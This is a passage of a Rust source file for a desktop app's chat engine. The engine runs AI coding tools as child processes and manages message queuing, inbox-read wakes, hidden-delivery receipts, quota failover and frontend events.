//! The chat engine: each timeline (lead = `-thread_id`, chat-mode worker =
//! `session_id`) runs through the selected tool stored on the thread/session.
//! Claude keeps a long-lived stream-json process; codex/opencode spawn one
//! process per turn. stdout is parsed (proto.rs), persisted (lead_message), and
//! pushed to the frontend over the `lead-chat` Tauri event. Interrupt rides the
//! tool protocol when available, with a kill fallback; a dead process resumes
//! via the stored native session id on the next send.

use crate::store::entities::lead_message;
use crate::store::{repo, Db};
use dashmap::{DashMap, DashSet};
use std::collections::{HashMap, VecDeque};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use tauri::{AppHandle, Emitter, Manager};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::{Child, ChildStdin, Command};

pub const EVENT: &str = "lead-chat";

/// Persisted activity status for a session/lead deliberately stopped by the
/// human (terminal takeover). Distinct from "idle" (a turn ended cleanly) so
/// single-writer-sensitive paths — boot revive AND coordinator
/// bus-wake delivery — can refuse to spawn a COMPETING headless process for a
/// session the human may be driving in their own terminal.
pub const STATUS_STOPPED: &str = "stopped";

/// The invisible prompt a bus wake delivers: tell the agent to drain its inbox.
/// One `bus_inbox` call reads every unread message, so a single read covers any
/// number of coalesced wakes (see `TurnState::request_bus_read`).
pub const BUS_WAKE_PROMPT: &str =
    "You have new messages on the thread bus. Call bus_inbox to read them. After incorporating any durable human answers that carry request_id, call bus_ack with those ids.";

/// Persist the turn-activity status for whichever surface this engine drives:
/// a worker session row (`Some`) or the lead's per-thread meta row (`None`).
async fn persist_activity(db: &Db, session_id: Option<i32>, thread_id: i32, status: &str) {
    match session_id {
        Some(sid) => {
            let _ = repo::set_session_status(db, sid, status).await;
        }
        None => {
            let _ = repo::set_lead_status(db, thread_id, status).await;
        }
    }
}

/// 流式节流间隔（ms）：每过这么久把当前累积文本落一次 DB 快照，并向 IM 桥发一帧
/// LeadDelta（飞书 CardKit 流式卡据此逐帧更新）。桌面 UI 不受影响——它吃的是每个
/// token 的原始 `Push::Delta`。150ms 是流式卡看着流畅的下限；再大就一顿一顿的。
const STREAM_THROTTLE_MS: u128 = 150;

/// Upper bound on a single resident-stdin write held under the engine lock (see
/// [`write_user`]). Generous: a healthy child drains instantly, so this only
/// trips on a wedged/dead child to keep the session from becoming unstoppable.
const WRITE_USER_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(60);

/// Warning threshold for a hidden receipt that is still waiting for its DB
/// transaction. This is diagnostic only: the transaction future is never
/// canceled, and the in-flight token remains an admission fence until commit or
/// rollback is known.
const HIDDEN_RECEIPT_WARNING: std::time::Duration = std::time::Duration::from_secs(60);

/// 一条待发排队消息的前端视图。`images`/`files` 仅给个数（栈里显示角标用）。
#[derive(Clone, serde::Serialize)]
pub struct QueuedItem {
    pub id: i32,
    pub text: String,
    pub images: usize,
    pub files: usize,
    /// True when the original send carried files or images; disables inline edit.
    pub has_attachments: bool,
}

pub(crate) fn queue_items(turn: &TurnState) -> Vec<QueuedItem> {
    turn.queue
        .iter()
        .filter_map(|o| {
            o.queue_id.map(|id| QueuedItem {
                id,
                text: o.text.clone(),
                images: o.images.len(),
                // files are appended into text; count is not separately tracked
                files: 0,
                has_attachments: o.has_attachments,
            })
        })
        .collect()
}

/// How many user-visible (tracked) messages are queued — what the cap counts.
/// Hidden plumbing deliveries (queue_id == None) are excluded.
fn visible_queued(turn: &TurnState) -> usize {
    turn.queue.iter().filter(|o| o.queue_id.is_some()).count()
}

fn plan_approval_turn_idle(turn: &TurnState) -> bool {
    !turn.busy && turn.queue.is_empty() && turn.bus_read_pos.is_none()
}

fn plan_approval_admissible(inner: &EngineInner) -> bool {
    !inner.rewinding && !inner.quota_failover_committing && plan_approval_turn_idle(&inner.turn)
}

/// Incremental pushes to the frontend. snake_case-tagged to match the TS side.
#[derive(Clone, serde::Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum Push {
    Message {
        thread_id: i32,
        message: crate::store::entities::lead_message::Model,
    },
    Delta {
        thread_id: i32,
        message_id: i32,
        text: String,
    },
    Finalize {
        thread_id: i32,
        message_id: i32,
        status: String,
        /// Cleaned final content, set only when the streamed row differs from what
        /// was persisted (codex app-server strips `<weft:*>` sentinels AFTER they
        /// streamed raw) — the frontend replaces the row text so the tags vanish.
        #[serde(skip_serializing_if = "Option::is_none")]
        content: Option<String>,
        /// Delivery-order key for a queued row that just became visible. The
        /// frontend applies this in the same update as `status=complete`, so the
        /// live timeline matches a freshly loaded DB snapshot immediately.
        #[serde(skip_serializing_if = "Option::is_none")]
        seq: Option<i64>,
    },
    Turn {
        thread_id: i32,
        /// Some(session) for chat-mode workers; None for the lead.
        session_id: Option<i32>,
        state: String,
        queue: Vec<QueuedItem>,
    },
    /// Authoritative engine identity after either a human switch or an
    /// automatic quota failover. Timeline markers explain the change, while
    /// this event keeps cached thread/direction/session badges in sync.
    EngineSwitched {
        thread_id: i32,
        session_id: Option<i32>,
        direction_id: Option<i32>,
        tool: String,
        model: Option<String>,
        command: Option<String>,
    },
    Init {
        thread_id: i32,
        session_id: Option<i32>,
        native_id: String,
        slash_commands: Vec<super::proto::SlashCmd>,
        /// claude `system/init` 才有(随首条消息到达);其余 init 推空。
        mcp_servers: Vec<super::proto::McpServer>,
        tools: Vec<String>,
        model: Option<String>,
        window: Option<u64>,
        #[serde(default)]
        mcp_known: bool,
    },
    /// The tool call currently executing — transient: rendered while it runs,
    /// replaced by the next one, cleared by the Turn event. Never persisted.
    /// Used for codex pills, which carry no input/output to expand.
    Activity {
        thread_id: i32,
        session_id: Option<i32>,
        name: String,
        summary: String,
    },
    /// 每个 turn 结束推一次当前上下文占用;window 跟随最近一次 init 的 model。
    Usage {
        thread_id: i32,
        session_id: Option<i32>,
        context_tokens: u64,
        window: Option<u64>,
        model: Option<String>,
    },
    /// A persisted `kind:"tool"` row received its result: replace the row's
    /// content (now carrying output) and status. Pairs with the earlier
    /// Push::Message that inserted the running row.
    ToolResult {
        thread_id: i32,
        message_id: i32,
        content: String,
        status: String,
    },
    /// A conversation rewind truncated this (thread, session) timeline: every
    /// open surface must reload from the DB. Carries the session's NEW native
    /// id (None = a fresh native session starts on next send) so live session
    /// state (Open App / Take Over commands) can't point at the abandoned
    /// pre-rewind conversation.
    Rewound {
        thread_id: i32,
        session_id: Option<i32>,
        native_id: Option<String>,
    },
    /// The delivery receipt's third tier (issue #94): the agent produced its
    /// first observed activity for the turn `message_id` (a "user" row)
    /// opened. Fired at most once per turn — see [`note_turn_activity`].
    Consumed {
        thread_id: i32,
        message_id: i32,
        consumed_at: i64,
    },
}

/// 进行中 turn 最多排队多少条人类消息（满后 send 拒绝入队）。
pub const MAX_QUEUED: usize = 5;

const HIDDEN_DELIVERY_TAG_PREFIX: &str = "__weft_hidden_delivery:";

fn hidden_delivery_tag(delivery_id: i32) -> String {
    format!("{HIDDEN_DELIVERY_TAG_PREFIX}{delivery_id}")
}

fn hidden_delivery_id_from_tag(tag: Option<&str>) -> Option<i32> {
    tag.and_then(|value| value.strip_prefix(HIDDEN_DELIVERY_TAG_PREFIX))
        .and_then(|value| value.parse::<i32>().ok())
        .filter(|value| *value > 0)
}

/// One outbound human message: text plus optional image attachments
/// (media_type, base64). Queued whole while a turn is running.
#[derive(Clone, Default)]
pub struct Outgoing {
    pub text: String,
    pub images: Vec<(String, String)>,
    /// true = backed by a queued timeline row (flips to complete on flush);
    /// false = invisible plumbing (coordinator nudges).
    pub tracked: bool,
    /// Opaque per-turn reply target carried from the caller (IM bridge) onto this
    /// turn's output frames. None for every non-IM send. Rides the queue so a
    /// queued turn keeps its own tag even when emitted after later sends.
    pub origin_tag: Option<String>,
    /// 入队时持久化的 queued 行 id；删/改/重排和交付落库按它定位。None=直接发送。
    pub queue_id: Option<i32>,
    /// True when the original send carried files or images (computed from the
    /// ORIGINAL inputs before per-turn image-spill clears out.images).
    pub has_attachments: bool,
    /// Absolute paths of images already spilled to `$TMP/weft-attachments` by
    /// the per-turn image-spill step (see `send()`), populated ONLY for the
    /// codex app-server transport — exec keeps to its plain-text path listing
    /// appended into `text` and never reads this field. `spawn_codex_turn`/
    /// `codex_consumer`'s queue flush hand these to `Client::
    /// start_turn_with_images` as `localImage` input items alongside the text.
    /// Always empty for every other tool/transport.
    pub local_image_paths: Vec<String>,
}

/// Busy/queue bookkeeping for one engine. Mirrors the TUI's own semantics:
/// input during a turn is queued whole and delivered in order once the turn
/// ends — never silently dropped, never interleaved mid-turn. Pure — tested.
#[derive(Default)]
pub struct TurnState {
    pub busy: bool,
    /// Set only by a structured provider signal observed while this exact turn
    /// is active. A generic error plus an old account snapshot is never enough
    /// to move work to another provider.
    pub quota_exceeded: bool,
    pub queue: VecDeque<Outgoing>,
    /// A bus wake landed while this engine was busy. Rather than queue one "read
    /// your inbox" turn per wake, we remember the wake's FIFO position — the
    /// number of messages already queued when it arrived — and synthesize a
    /// SINGLE inbox-read there. Messages queued BEFORE the wake drain first, then
    /// the read, then anything queued after (so a later user send can't jump
    /// ahead of an earlier bus message). One `bus_inbox` reads everything, so any
    /// number of wakes during a turn coalesce into this one read (`is_none`
    /// guard keeps the earliest position). No timer, never interleaved mid-turn.
    pub bus_read_pos: Option<usize>,
}

impl TurnState {
    /// true = caller may write to stdin now; false = caller must enqueue.
    pub fn try_begin_send(&mut self) -> bool {
        if self.busy {
            return false;
        }
        self.busy = true;
        self.quota_exceeded = false;
        true
    }

    /// A bus wake arrived. Returns true if the caller should start a read turn
    /// right now (engine idle); false means it was coalesced into the running
    /// turn and will be read at its FIFO position once the queue drains there
    /// (see `on_turn_end`). The `is_none` guard keeps the earliest wake's
    /// position so a later wake can't push the read behind newer messages.
    pub fn request_bus_read(&mut self) -> bool {
        if self.busy {
            if self.bus_read_pos.is_none() {
                self.bus_read_pos = Some(self.queue.len());
            }
            false
        } else {
            self.busy = true;
            self.quota_exceeded = false;
            true
        }
    }

    /// Turn finished: deliver the next thing in FIFO order. Messages queued
    /// before a coalesced bus wake drain first; when the wake's position is
    /// reached, synthesize one invisible inbox-read turn; then the rest; finally
    /// go idle.
    pub fn on_turn_end(&mut self) -> Option<Outgoing> {
        let next = match self.bus_read_pos {
            // The wake sits at the front: read the inbox now (stays busy).
            Some(0) => {
                self.bus_read_pos = None;
                Some(Outgoing {
                    text: BUS_WAKE_PROMPT.to_string(),
                    images: vec![],
                    tracked: false,
                    origin_tag: None,
                    queue_id: None,
                    has_attachments: false,
                    local_image_paths: Vec::new(),
                })
            }
            // A message queued before the wake goes first; the wake slides up one.
            Some(n) => {
                let next = self.queue.pop_front();
                self.bus_read_pos = Some(n.saturating_sub(1));
                // Defensive: if the queue emptied early, read at turn-end anyway
                // rather than stranding the pending wake.
                next.or_else(|| self.on_turn_end())
            }
            None => match self.queue.pop_front() {
                Some(next) => Some(next),
                None => {
                    self.busy = false;
                    None
                }
            },
        };
        self.quota_exceeded = false;
        next
    }

    /// 删除某条仍排队的消息；true=删掉了。
    pub fn remove(&mut self, id: i32) -> bool {
        let Some(pos) = self.queue.iter().position(|o| o.queue_id == Some(id)) else {
            return false;
        };
        self.queue.remove(pos);
        // A coalesced bus-read sits at a FIFO index; dropping an item before it
        // shifts that index left, else a later send would jump ahead of the wake.
        if let Some(n) = self.bus_read_pos {
            if pos < n {
                self.bus_read_pos = Some(n - 1);
            }
        }
        true
    }

    /// 改某条排队消息文本；true=改了。
    pub fn edit(&mut self, id: i32, text: &str) -> bool {
        for o in self.queue.iter_mut() {
            if o.queue_id == Some(id) {
                o.text = text.to_string();
                return true;
            }
        }
        false
    }

    /// 按 id 列表重排；order 必须是当前可见(有 queue_id)项的排列，否则不动并返回 false。
    pub fn reorder(&mut self, order: &[i32]) -> bool {
        // A pending invisible bus wake pins a FIFO index (bus_read_pos); reordering
        // would mis-place it relative to the wake, so refuse while one is pending
        // (rare/transient — the composer re-syncs the drag from the re-emitted state).
        if self.bus_read_pos.is_some() {
            return false;
        }
        let tracked: Vec<i32> = self.queue.iter().filter_map(|o| o.queue_id).collect();
        if order.len() != tracked.len() {
            return false;
        }
        let mut a = order.to_vec();
        let mut b = tracked.clone();
        a.sort_unstable();
        b.sort_unstable();
        if a != b {
            return false;
        }
        // Reorder only the visible (user) items; untracked deliveries — internal
        // nudges / bus replies queued mid-turn — keep their absolute slots so a user
        // drag never drops or resequences them.
        let slots: Vec<bool> = self.queue.iter().map(|o| o.queue_id.is_some()).collect();
        let mut by_id: HashMap<i32, Outgoing> = HashMap::new();
        let mut untracked: VecDeque<Outgoing> = VecDeque::new();
        for o in self.queue.drain(..) {
            match o.queue_id {
                Some(id) => {
                    by_id.insert(id, o);
                }
                None => untracked.push_back(o),
            }
        }
        let mut order_it = order.iter();
        let mut next: VecDeque<Outgoing> = VecDeque::new();
        for is_tracked in slots {
            if is_tracked {
                if let Some(o) = order_it.next().and_then(|id| by_id.remove(id)) {
                    next.push_back(o);
                }
            } else if let Some(o) = untracked.pop_front() {
                next.push_back(o);
            }
        }
        self.queue = next;
        true
    }
}

/// L3 failover is permitted only at an idle failed-turn boundary. When a queued
/// user message or coalesced inbox read already owns the next turn, leave this
/// engine alone rather than race a healthy follow-up turn with a switch.
fn should_attempt_quota_failover(
    status: &str,
    structured_exceeded: bool,
    still_busy: bool,
) -> bool {
    status == "error" && structured_exceeded && !still_busy
}

fn structured_codex_exhaustion_snapshot(
    tool: &str,
    previous: Option<&crate::engine_quota::QuotaSnapshot>,
) -> Option<crate::engine_quota::QuotaSnapshot> {
    if tool != "codex" {
        return None;
    }
    Some(crate::engine_quota::QuotaSnapshot {
        tool: "codex".to_string(),
        status: crate::engine_quota::QuotaStatus::Exceeded,
        // The structured exhaustion event says only that the limit was hit.
        // Keep the richer account snapshot's reset/window metadata visible.
        used_percent: previous.and_then(|snapshot| snapshot.used_percent),
        resets_at: previous.and_then(|snapshot| snapshot.resets_at),
        window_label: previous.and_then(|snapshot| snapshot.window_label.clone()),
        observed_at: crate::engine_quota::now_unix(),
    })
}

/// Per-turn dialects (codex `exec --json`, opencode `run --format json`) spawn
/// one process per human turn; only claude keeps a long-lived stream process.
pub fn per_turn(tool: &str) -> bool {
    crate::adapters::adapter_for(tool).is_some_and(|a| a.per_turn())
}

#[derive(Debug, PartialEq, Eq)]
enum HiddenDelivery {
    Noop,
    Queue,
    SpawnTurn,
    WriteResident,
}

fn hidden_delivery(tool: &str, busy: bool, has_stdin: bool, stopped: bool) -> HiddenDelivery {
    if stopped {
        HiddenDelivery::Noop
    } else if busy {
        HiddenDelivery::Queue
    } else if per_turn(tool) || is_acp_tool(tool) {
        // Per-turn tools and ACP connection tools have no resident stdin when
        // idle — both need a turn spawn (ACP → spawn_acp_turn; per-turn →
        // spawn_turn / codex appserver redirect in send_hidden_inner).
        HiddenDelivery::SpawnTurn
    } else if has_stdin {
        HiddenDelivery::WriteResident
    } else {
        HiddenDelivery::Noop
    }
}

fn mark_hidden_turn_started(inner: &mut EngineInner) -> i32 {
    mark_hidden_turn_started_with_delivery(inner, None)
}

fn mark_hidden_turn_started_with_delivery(
    inner: &mut EngineInner,
    hidden_delivery_id: Option<i32>,
) -> i32 {
    let _ = inner.turn.try_begin_send();
    inner.turn_id += 1;
    inner.clock.begin_turn();
    // Plumbing starts a turn directly (not via send): keep the invariant.
    inner.current_origin_tag = None;
    // No user row opens a hidden turn (it carries no `queue_id`/tracked row) —
    // clear the pointer rather than leave it stale on whatever real turn ran
    // last. Left stale, it would misattribute this turn's outcome to that old
    // row: the rewind anchor (`set_lead_message_anchor` on TurnEnd) and the
    // "consumed" receipt (`note_turn_activity`) both key off `turn_user_row`.
    // A negative marker occupies the existing pointer without ever being
    // mistaken for a lead_message id. It lets the activity receipt follow a
    // hidden delivery through the same queue/dequeue bookkeeping as visible
    // turns while preserving the rewind anchor's `None` semantics.
    inner.turn_user_row = hidden_delivery_id.map(|id| -id);
    inner.turn_id
}

/// Returns `None` when the turn isn't ours to reset (id advanced / not busy);
/// `Some(drained)` — the queue_ids of the still-queued rows cleared here — when
/// it reset. The caller finalizes EXACTLY those rows: a session-wide queued
/// sweep after the lock drops could catch a concurrent send's row inserted
/// meanwhile and fail a message that is about to be delivered.
fn reset_failed_hidden_turn(inner: &mut EngineInner, turn_id: i32) -> Option<Vec<i32>> {
    if inner.turn_id != turn_id || !inner.turn.busy {
        return None;
    }
    inner.turn.busy = false;
    let drained: Vec<i32> = inner.turn.queue.iter().filter_map(|o| o.queue_id).collect();
    inner.turn.queue.clear();
    inner.current_origin_tag = None;
    inner.turn_user_row = None;
    // Do not clear `hidden_receipt_inflight`: an activity receipt may already
    // be waiting on the admission gate even though this hidden spawn rolled
    // back. Its DB result must still linearize before a retry can replay it.
    inner.child = None;
    // Dropping `child` kills it (kill_on_drop), so its session_gate slot and its
    // computer bearer both go with it — see `release_child_slot`. Inside the
    // turn_id+busy guard, as that helper requires.
    release_child_slot(inner);
    inner.stdin = None;
    inner.current = None;
    inner.interrupting = false;
    Some(drained)
}

fn emit_finalize(app: &AppHandle, thread_id: i32, message_id: i32, status: &str) {
    let _ = app.emit(
        EVENT,
        Push::Finalize {
            thread_id,
            message_id,
            status: status.into(),
            content: None,
            seq: None,
        },
    );
}

async fn mark_queued_delivered(
    app: &AppHandle,
    db: &Db,
    thread_id: i32,
    session_id: Option<i32>,
    out: &Outgoing,
) {
    if !out.tracked {
        return;
    }
    let res = match out.queue_id {
        Some(id) => repo::complete_queued_by_id(db, id).await,
        None => repo::complete_queued(db, thread_id, session_id).await,
    };
    match res {
        Ok(Some(m)) => {
            // Stamp a delivery-order seq so reordered rows appear in send order
            // (not creation order) both live and after a transcript reload.
            let seq = match repo::assign_delivery_seq(db, thread_id, m.id).await {
                Ok(seq) => Some(seq),
                Err(e) => {
                    eprintln!("[weft] assign_delivery_seq failed: {e}");
                    None
                }
            };
            // Carry the (possibly edited) text so the transcript shows what was
            // delivered, not the stale original Push::Message body.
            let content = finalize_text(&m, out);
            let _ = app.emit(
                EVENT,
                Push::Finalize {
                    thread_id,
                    message_id: m.id,
                    status: "complete".into(),
                    content,
                    seq,
                },
            );
        }
        Ok(None) => {}
        Err(e) => eprintln!("[weft] queued message complete failed: {e}"),
    }
}

/// A delivered row's text, but only for a plain text row with no attachments. The
/// finalize-content channel wraps content as `{text}`, which would mangle a command
/// row or drop image/file chips — those keep their original cached body (None).
fn finalize_text(
    m: &crate::store::entities::lead_message::Model,
    out: &Outgoing,
) -> Option<String> {
    // Only plain text rows round-trip: command rows ({command,args}) and
    // attachment-bearing rows keep their cached body (finalize wraps as {text},
    // which would drop the image/file chips).
    if m.kind != "text" || !out.images.is_empty() {
        return None;
    }
    // Check the PERSISTED attachments too: per-turn dialects spill pasted images to
    // temp files and clear out.images, but m.content still carries images/files —
    // replacing such a row with {text} would lose its preview.
    let attach_free = serde_json::from_str::<serde_json::Value>(&m.content)
        .ok()
        .map(|v| {
            let empty = |k: &str| {
                v.get(k)
                    .and_then(|x| x.as_array())
                    .map(|a| a.is_empty())
                    .unwrap_or(true)
            };
            empty("images") && empty("files")
        })
        .unwrap_or(true);
    if !attach_free {
        return None;
    }
    // Source the text from the in-memory Outgoing (already reflects any edit) so a
    // not-yet-persisted edit can't make the live finalize show stale text.
    Some(out.text.clone())
}

/// Returns how many queued rows were finalized — `teardown_for_switch` needs
/// it to answer "did this actually interrupt anything"; every other caller
/// ignores it.
async fn mark_queued_status(
    app: &AppHandle,
    db: &Db,
    thread_id: i32,
    session_id: Option<i32>,
    status: &str,
) -> usize {
    match repo::set_queued_status(db, thread_id, session_id, status).await {
        Ok(rows) => {
            let n = rows.len();
            for m in rows {
                emit_finalize(app, thread_id, m.id, status);
            }
            n
        }
        Err(e) => {
            eprintln!("[weft] queued message {status} finalize failed: {e}");
            0
        }
    }
}

/// Record that the child produced SOME event for the in-flight turn. This is the
/// ONE choke point every dialect's reader (resident/per-turn stdout in
/// `spawn_reader`, codex app-server's `codex_consumer`) calls for the delivery
/// receipt's third tier (issue #94 — "已被 agent 消费"). Activity timing is
/// telemetry only and never drives agent state.
///
/// The first time this fires since the turn began, best-effort mark the
/// turn's opening user row (`turn_user_row`) consumed and push the receipt.
/// Fire-and-forget, off the engine lock: `mark_message_consumed` is a single
/// idempotent UPDATE keyed by message id, so a dropped/delayed mark only
/// delays the UI receipt — it can never block, retry into, or corrupt turn
/// delivery (no OCC state is read or written here).
///
/// PR #117 review, P2: a QUEUED delivery's row only flips `status ==
/// "complete"` AFTER its turn is already dispatched (`mark_queued_delivered`
/// runs after `spawn_turn`/`client.start_turn` — see the flush sites), so the
/// agent's first activity can race ahead of that flip and find the row
/// `NotEligible`. Burning the one-shot gate on that transient outcome would
/// strand the receipt at "delivered" forever even though the agent is
/// actively working — so a `NotEligible` result re-arms the gate (only if
/// this engine is still on the SAME turn/row) instead of accepting it as
/// final.
fn note_turn_activity(app: &AppHandle, db: &Db, eng: &EngineRef, inner: &mut EngineInner) {
    if !inner.clock.mark_consumed_once() {
        return;
    }
    let Some(message_id) = inner.turn_user_row else {
        return;
    };
    if message_id < 0 {
        let delivery_id = -message_id;
        // Register the receipt while still holding the engine mutex, before
        // spawning the task that waits on the per-surface admission gate. A
        // TurnEnd/EOF handler may retarget `turn_user_row` before that task is
        // polled; the in-flight id is the durable reservation that keeps a
        // concurrent visible admission from enqueueing the same pending row.
        if !register_hidden_receipt(&mut *inner, delivery_id) {
            return;
        }
        let admission_key = inner
            .session_id
            .map(i64::from)
            .unwrap_or_else(|| super::commands::lead_key(inner.thread_id));
        let db = db.clone();
        let eng = eng.clone();
        let registry = inner.hidden_receipt_inflight.clone();
        let db_for_consume = db.clone();
        tauri::async_runtime::spawn(run_hidden_receipt_worker(
            db,
            eng,
            admission_key,
            delivery_id,
            registry,
            async move { repo::consume_lead_hidden_delivery(&db_for_consume, delivery_id).await },
            HIDDEN_RECEIPT_WARNING,
            None,
        ));
        return;
    }
    let app = app.clone();
    let db = db.clone();
    let eng = eng.clone();
    tauri::async_runtime::spawn(async move {
        match repo::mark_message_consumed(&db, message_id).await {
            Ok(repo::ConsumeMark::Marked(m)) => {
                let _ = app.emit(
                    EVENT,
                    Push::Consumed {
                        thread_id: m.thread_id,
                        message_id: m.id,
                        consumed_at: m.consumed_at.unwrap_or_default(),
                    },
                );
            }
            Ok(repo::ConsumeMark::AlreadyConsumed) => {}
            Ok(repo::ConsumeMark::NotEligible) => {
                let mut i = eng.lock().await;
                // Ownership-guarded like every other post-await re-lock in
                // this file: only re-arm if turn_user_row still names THIS
                // row. If it moved on (a stop/reset, or the turn already
                // advanced), a stale retry permit would misattribute a LATER
                // turn's activity — advance_dequeued_turn already retargeted
                // the gate correctly for that turn, don't second-guess it.
                if i.turn_user_row == Some(message_id) {
                    i.clock.rearm_consumed_gate();
                }
            }
            Err(e) => eprintln!("[weft] mark_message_consumed failed: {e}"),
        }
    });
}

/// Single construction point for the Push::Turn state event. `state` is the wire
/// vocabulary the frontend maps to SessionStatus: "busy" | "idle".
fn emit_turn_push(
    app: &AppHandle,
    thread_id: i32,
    session_id: Option<i32>,
    state: &str,
    queue: Vec<QueuedItem>,
) {
    let _ = app.emit(
        EVENT,
        Push::Turn {
            thread_id,
            session_id,
            state: state.into(),
            queue,
        },
    );
}

fn emit_turn_state(
    app: &AppHandle,
    thread_id: i32,
    session_id: Option<i32>,
    busy: bool,
    queue: Vec<QueuedItem>,
) {
    emit_turn_push(
        app,
        thread_id,
        session_id,
        if busy { "busy" } else { "idle" },
        queue,
    );
}

/// Whether a HIDDEN turn (a bus wake, a plumbing delivery) may start now.
///
/// The visible path asks `send_reservation_valid`; hidden delivery never passes
/// through it, so the teardown reservation has to be checked here too. Without
/// this, a teardown holding `tearing_down` — which has already cleared
/// `turn.busy` and `interrupting` and bumped the epoch — is invisible to a bus
/// wake, which then starts a fresh native session mid-cleanup and has its
/// native id cleared and an idle state emitted over it by the older reset.
///
/// Split out rather than inlined at both call sites so the two entry points
/// cannot drift, and so the rule is testable without an `AppHandle`.
fn hidden_turn_admissible(inner: &EngineInner) -> bool {
    !inner.stopped && !inner.tearing_down
}

/// Whether a hidden admission should ensure a resident that is already active.
/// Durable hydration needs this even when its caller did not request a revive;
/// stopped background rows remain deferred, while an explicit path may clear
/// `stopped` before calling this policy.
fn should_ensure_active_resident(
    inner: &EngineInner,
    ensure: bool,
    hidden_delivery_id: Option<i32>,
) -> bool {
    !inner.stopped && (ensure || hidden_delivery_id.is_some())
}

fn hidden_delivery_is_duplicate(inner: &EngineInner, delivery_id: i32) -> bool {
    inner.hidden_receipt_inflight.contains(&delivery_id)
        || inner.turn_user_row == Some(-delivery_id)
        || inner.turn.queue.iter().any(|out| {
            hidden_delivery_id_from_tag(out.origin_tag.as_deref()) == Some(delivery_id)
        })
}

/// Register the durable hidden-delivery receipt before its asynchronous DB
/// transaction is scheduled. This must run under the engine mutex (the caller
/// already owns it), so TurnEnd/EOF cannot clear the only marker between the
/// activity observation and task creation. Returns false when an older receipt
/// for the same delivery is already in flight; one DB consume is sufficient.
fn register_hidden_receipt(inner: &mut EngineInner, delivery_id: i32) -> bool {
    inner.hidden_receipt_inflight.insert(delivery_id)
}

type HiddenReceiptResult =
    anyhow::Result<Option<crate::store::entities::lead_hidden_delivery::Model>>;

/// A receipt worker's authoritative fallback state after its DB task panics or
/// is otherwise unable to return a result. Unknown/read-error states remain
/// unresolved: guessing rollback would reopen a duplicate-delivery window.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum HiddenReceiptAuthoritativeState {
    ConsumedOrMissing,
    Pending,
    Unknown,
}

async fn settle_hidden_receipt(
    eng: &EngineRef,
    admission_key: i64,
    delivery_id: i32,
    consumed: bool,
) {
    let _serial = admission_gate_for_key(admission_key).lock_owned().await;
    let mut inner = eng.lock().await;
    finish_hidden_receipt(&mut inner, delivery_id, consumed);
}

/// A panic/JoinError means the consume future did not report whether SQLite
/// committed. Keep the shared token while repeatedly re-reading the durable row
/// under the admission gate. Only an authoritative missing/consumed or pending
/// state releases it; temporary read errors retain the fence and retry with
/// backoff until the DB becomes readable (or the process is restarted).
async fn recover_hidden_receipt_after_worker_failure(
    eng: &EngineRef,
    db: &Db,
    admission_key: i64,
    delivery_id: i32,
) {
    let mut backoff = std::time::Duration::from_millis(100);
    const MAX_BACKOFF: std::time::Duration = std::time::Duration::from_secs(5);
    loop {
        let _serial = admission_gate_for_key(admission_key).lock_owned().await;
        let state = match repo::get_lead_hidden_delivery(db, delivery_id).await {
            Ok(None) => HiddenReceiptAuthoritativeState::ConsumedOrMissing,
            Ok(Some(row)) if row.state == repo::LEAD_HIDDEN_DELIVERY_CONSUMED => {
                HiddenReceiptAuthoritativeState::ConsumedOrMissing
            }
            Ok(Some(row)) if row.state == repo::LEAD_HIDDEN_DELIVERY_PENDING => {
                HiddenReceiptAuthoritativeState::Pending
            }
            Ok(Some(row)) => {
                eprintln!(
                    "[weft] hidden receipt {delivery_id} has unknown durable state {:?}; retaining fence",
                    row.state
                );
                HiddenReceiptAuthoritativeState::Unknown
            }
            Err(error) => {
                eprintln!(
                    "[weft] hidden receipt {delivery_id} authoritative reread failed: {error}; retaining fence"
                );
                HiddenReceiptAuthoritativeState::Unknown
            }
        };
        match state {
            HiddenReceiptAuthoritativeState::ConsumedOrMissing => {
                let mut inner = eng.lock().await;
                finish_hidden_receipt(&mut inner, delivery_id, true);
                return;
            }
            HiddenReceiptAuthoritativeState::Pending => {
                let mut inner = eng.lock().await;
                finish_hidden_receipt(&mut inner, delivery_id, false);
                return;
            }
            HiddenReceiptAuthoritativeState::Unknown => {
                drop(_serial);
                tokio::time::sleep(backoff).await;
                backoff = std::cmp::min(backoff.saturating_mul(2), MAX_BACKOFF);
            }
        }
    }
}

/// Run one hidden receipt's DB transaction to completion without holding the
/// admission gate. The caller detaches this worker, so an admission/engine task
/// cannot abort the transaction future at the warning threshold. The shared
/// in-flight token remains visible to every engine replacement until this worker
/// observes a committed success or a definite rollback/error, then the short
/// gate+engine cleanup linearizes the result.
async fn run_hidden_receipt_worker<F>(
    db: Db,
    eng: EngineRef,
    admission_key: i64,
    delivery_id: i32,
    registry: Arc<DashSet<i32>>,
    consume: F,
    warning_after: std::time::Duration,
    warning_tx: Option<tokio::sync::oneshot::Sender<()>>,
) where
    F: std::future::Future<Output = HiddenReceiptResult> + Send + 'static,
{
    let completed = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let warning_done = completed.clone();
    let warning_registry = registry.clone();
    tauri::async_runtime::spawn(async move {
        let mut warning_tx = warning_tx;
        loop {
            tokio::time::sleep(warning_after).await;
            if warning_done.load(std::sync::atomic::Ordering::Acquire) {
                return;
            }
            if warning_registry.contains(&delivery_id) {
                eprintln!(
                    "[weft] hidden receipt {delivery_id} still awaiting DB outcome after {:?}",
                    warning_after
                );
                if let Some(tx) = warning_tx.take() {
                    let _ = tx.send(());
                }
            }
        }
    });

    // Do not wrap this future in `timeout`: dropping a SeaORM transaction future
    // does not tell us whether SQLite committed or rolled back. A separately
    // spawned DB task lets this supervisor await a JoinError on panic without
    // losing ownership of the receipt lifecycle.
    let db_worker = tauri::async_runtime::spawn(consume);
    match db_worker.await {
        Ok(Ok(Some(_))) | Ok(Ok(None)) => {
            completed.store(true, std::sync::atomic::Ordering::Release);
            settle_hidden_receipt(&eng, admission_key, delivery_id, true).await;
        }
        Ok(Err(error)) => {
            completed.store(true, std::sync::atomic::Ordering::Release);
            eprintln!("[weft] consume hidden delivery failed: {error}");
            settle_hidden_receipt(&eng, admission_key, delivery_id, false).await;
        }
        Err(join_error) => {
            eprintln!(
                "[weft] hidden receipt worker terminated before reporting DB outcome: {join_error}; rereading"
            );
            recover_hidden_receipt_after_worker_failure(
                &eng,
                &db,
                admission_key,
                delivery_id,
